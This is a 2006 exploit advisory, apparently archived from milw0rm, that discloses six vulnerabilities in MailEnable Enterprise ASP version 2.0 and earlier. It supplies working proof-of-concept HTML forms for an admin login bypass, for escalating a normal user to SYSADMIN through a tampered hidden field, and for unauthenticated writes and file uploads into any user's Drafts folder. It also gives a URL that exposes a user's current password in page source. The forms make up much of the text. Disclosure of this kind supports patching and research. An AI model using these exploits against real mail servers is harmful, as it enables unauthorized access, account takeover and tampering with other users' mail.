<html><head><title>MailEnable Enterprise <= 2.0 (ASP Version) Multiple Vulnerabilities</title></head><pre>Hi, I'm Soroush Dalili from GrayHatz Security Group (GSG). I found multiple bugs in 
MailEnable Enterprise Edition ASP Version &lt;= 2.0 that I listed them below:

1) - Any user can login to web administration site.
2) - Authenticated normal user can gain ADMIN or SYSADMIN level, also remote user can disable him/her account!
3) - Every one (ever no authenticated user) can write a message in &quot;Draft&quot; folder of any users!
4) - Every one can make &quot;myupload.ams&quot; on server in &quot;drafts&quot; folder of every user!
5) - Every one can make &quot;_myupload.csv&quot; on server in &quot;drafts&quot; folder of every user!
6) - For changing password it need the current password but current password is mention in source of &quot;ListAttachments.asp&quot; file, if XSS attack or Session hijacking happened then attacker can gain the user's current password.



Details' Descriptions:

1)
Any user can login to web administration site with bug in &quot;main.asp&quot; (Enterprise)

Proof's exploit:
-----------------------Start--------------------------
&lt;FORM NAME=FrmMain ACTION=&quot;http://[URL]/meadmin/enterprise/lang/EN/main.asp&quot; METHOD=&quot;POST&quot;&gt;
	POSTOFFICE&lt;INPUT NAME=POSTOFFICE TYPE=&quot;text&quot; VALUE=&quot;postmaster&quot;&gt;&lt;br&gt;
&lt;input type=submit&gt;
&lt;/FORM&gt;
-----------------------End----------------------------

2)
Authenticated normal user can gain ADMIN or SYSADMIN level, also remote user can disable him/her account!

Bug in &quot;MailOptions.asp&quot; file: remote authenticated user can change value of hidden field (name=&quot;LoginRights&quot;) 
from &quot;USER&quot; to &quot;ADMIN&quot; or &quot;SYSADMIN&quot; and change it's level to up! or change value of hidden field 
(name=&quot;LoginStatus&quot;) to &quot;0&quot; to disable him/her account!

Proof's exploit:
-----------------------Start--------------------------
&lt;FORM METHOD=&quot;post&quot; ACTION=&quot;http://[URL]/MEWebMail/base/default/lang/EN/MailOptions.asp?SelectedIndex=1&amp;FormAction=Edit&quot;&gt;

&lt;TABLE BORDER=&quot;0&quot;&gt;
	&lt;TR&gt;&lt;TD&gt;Current Password:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=LoginPassword VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
	&lt;TR&gt;&lt;TD&gt;New Password:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=NewLoginPassword VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
	&lt;TR&gt;&lt;TD&gt;Confirm New Password:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=ConfirmNewLoginPassword VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
&lt;/TABLE&gt;
&lt;INPUT NAME=&quot;LoginDescription&quot; VALUE=&quot;Login description&quot;&gt;
&lt;INPUT NAME=&quot;LoginRights&quot; VALUE=&quot;SYSADMIN&quot;&gt;
&lt;INPUT NAME=&quot;LoginStatus&quot; VALUE=&quot;1&quot;&gt;
&lt;BR&gt;&lt;BR&gt;
&lt;INPUT type=submit value=&quot;UpTime!&quot;&gt;
&lt;/FORM&gt;
-----------------------End----------------------------

3)
Every one (ever no authenticated user) can write a message in &quot;Draft&quot; folder of any users!
Bug in &quot;Resolve.asp&quot; file: this file don't check authenticated user!

Proof's exploit:
--------------Start---------------------
&lt;FORM METHOD=&quot;post&quot; ACTION=&quot;http://[url]/MEWebMail/base/default/lang/EN/Forms/MAI/Resolve.asp&quot;&gt;

&lt;TABLE BORDER=&quot;0&quot;&gt;
	&lt;TR&gt;&lt;TD&gt;ME_MAILBOX:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=ME_MAILBOX VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
	&lt;TR&gt;&lt;TD&gt;ME_POSTOFFICE:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=ME_POSTOFFICE VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
	&lt;TR&gt;&lt;TD&gt;Folder:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=Folder VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
	&lt;TR&gt;&lt;TD&gt;ID:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=ID VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
	&lt;TR&gt;&lt;TD&gt;ComposeMode:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=ComposeMode VALUE=&quot;General&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;	
	&lt;TR&gt;&lt;TD&gt;MsgFrom:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=MsgFrom VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
	&lt;TR&gt;&lt;TD&gt;MsgCc:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=MsgCc VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
	&lt;TR&gt;&lt;TD&gt;MsgTo:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=MsgTo VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
	&lt;TR&gt;&lt;TD&gt;MsgBCC:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=MsgBCC VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
	&lt;TR&gt;&lt;TD&gt;MsgBody:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=MsgBody VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
	&lt;TR&gt;&lt;TD&gt;MsgSubject:&lt;/TD&gt;&lt;TD&gt;&lt;INPUT name=MsgSubject VALUE=&quot;&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
&lt;/TABLE&gt;
&lt;BR&gt;&lt;BR&gt;
&lt;INPUT type=submit value=&quot;Update&quot;  CLASS=ME_Button&gt;
&lt;/FORM&gt;
--------------End---------------------

4)
Make &quot;myupload.ams&quot; on server in &quot;drafts&quot; folder of every user!
Show Mail Enable folder's path if &quot;username&quot; or &quot;postoffices&quot; be incorrect!

Proof's exploit:
-----------------------Start--------------------------
&lt;FORM NAME=FrmMain ACTION=&quot;http://[URL]/MEWebMail/base/default/lang/EN/Forms/MAI/UploadAttachment.asp&quot; ENCTYPE=&quot;multipart/form-data&quot; METHOD=&quot;POST&quot;&gt;
	MESSAGEID&lt;INPUT NAME=MESSAGEID TYPE=&quot;text&quot; VALUE=&quot;test&quot;&gt;&lt;br&gt;
	POSTOFFICE&lt;INPUT NAME=POSTOFFICE TYPE=&quot;text&quot; VALUE=&quot;default&quot;&gt;&lt;br&gt;
	AUTH_PASSWORD&lt;INPUT NAME=AUTH_PASSWORD TYPE=&quot;text&quot; VALUE=&quot;&quot;&gt;&lt;br&gt;
	AUTH_USERNAME&lt;INPUT NAME=AUTH_USERNAME TYPE=&quot;text&quot; VALUE=&quot;testuser&quot;&gt;&lt;br&gt;
	Mode&lt;INPUT NAME=Mode TYPE=&quot;text&quot; VALUE=&quot;Compose&quot;&gt;&lt;br&gt;
	Folder&lt;INPUT NAME=Folder TYPE=&quot;text&quot; VALUE=&quot;\Drafts&quot;&gt;&lt;br&gt;
	ID&lt;INPUT NAME=ID TYPE=&quot;text&quot; VALUE=&quot;test&quot;&gt;&lt;br&gt;
&lt;TABLE&gt;
&lt;TR&gt;&lt;TD&gt;File Name&lt;/TD&gt;&lt;TD&gt;
&lt;INPUT TYPE=FILE NAME=&quot;txtFile&quot;&gt;
&lt;INPUT TYPE=submit VALUE=&quot;Add&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
&lt;/TABLE&gt;
&lt;/FORM&gt;
-----------------------End----------------------------

5)
Make &quot;_myupload.csv&quot; on server in &quot;drafts&quot; folder of every user!
Show Mail Enable folder's path if &quot;username&quot; or &quot;postoffices&quot; be incorrect!
Proof's exploit:
-----------------------Start--------------------------
&lt;FORM NAME=FrmMain ACTION=&quot;http://[URL]/MEWebMail/base/enterprise/lang/EN/Forms/vcf/uploadcontact.asp&quot; ENCTYPE=&quot;multipart/form-data&quot; METHOD=&quot;POST&quot;&gt;
	MESSAGEID&lt;INPUT NAME=MESSAGEID TYPE=&quot;text&quot; VALUE=&quot;test123&quot;&gt;&lt;br&gt;
	POSTOFFICE&lt;INPUT NAME=POSTOFFICE TYPE=&quot;text&quot; VALUE=&quot;default&quot;&gt;&lt;br&gt;
	AUTH_PASSWORD&lt;INPUT NAME=AUTH_PASSWORD TYPE=&quot;text&quot; VALUE=&quot;&quot;&gt;&lt;br&gt;
	AUTH_USERNAME&lt;INPUT NAME=AUTH_USERNAME TYPE=&quot;text&quot; VALUE=&quot;testuser&quot;&gt;&lt;br&gt;
	Mode&lt;INPUT NAME=Mode TYPE=&quot;text&quot; VALUE=&quot;Compose&quot;&gt;&lt;br&gt;
	Folder&lt;INPUT NAME=Folder TYPE=&quot;text&quot; VALUE=&quot;\Drafts&quot;&gt;&lt;br&gt;
	ID&lt;INPUT NAME=ID TYPE=&quot;text&quot; VALUE=&quot;test123&quot;&gt;&lt;br&gt;
&lt;TABLE&gt;
&lt;TR&gt;&lt;TD&gt;File Name&lt;/TD&gt;&lt;TD&gt;
&lt;INPUT TYPE=FILE NAME=&quot;txtFile&quot;&gt;
&lt;INPUT TYPE=submit VALUE=&quot;Add&quot;&gt;&lt;/TD&gt;&lt;/TR&gt;
&lt;/TABLE&gt;
&lt;/FORM&gt;
-----------------------End----------------------------

6)
Have password in source.
Proof:
-----------------------Start--------------------------
http://[URL]/MEWebmail/base/enterprise/lang/EN/Forms/MAI/ListAttachments.asp?Mode=Compose&amp;ID=test.MAI&amp;MsgFormat=HTML&amp;FormAction=Send&amp;ComposeMode=General&amp;Folder=%5CDrafts
-----------------------End----------------------------


Product name: MailEnable Enterprise Edition
Version: All ASP version &lt;= 2.0
URL: www.mailenable.com
Finder: Soroush Dalili
Team: GSG [Grayhatz.net]
Country: Iran
Site: Grayhatz.net
Email: IRSDL[a.t]Yahoo[d0t]Com

&lt;&lt; I hope secure world for all &gt;&gt;

# milw0rm.com [2006-06-09]</pre></html>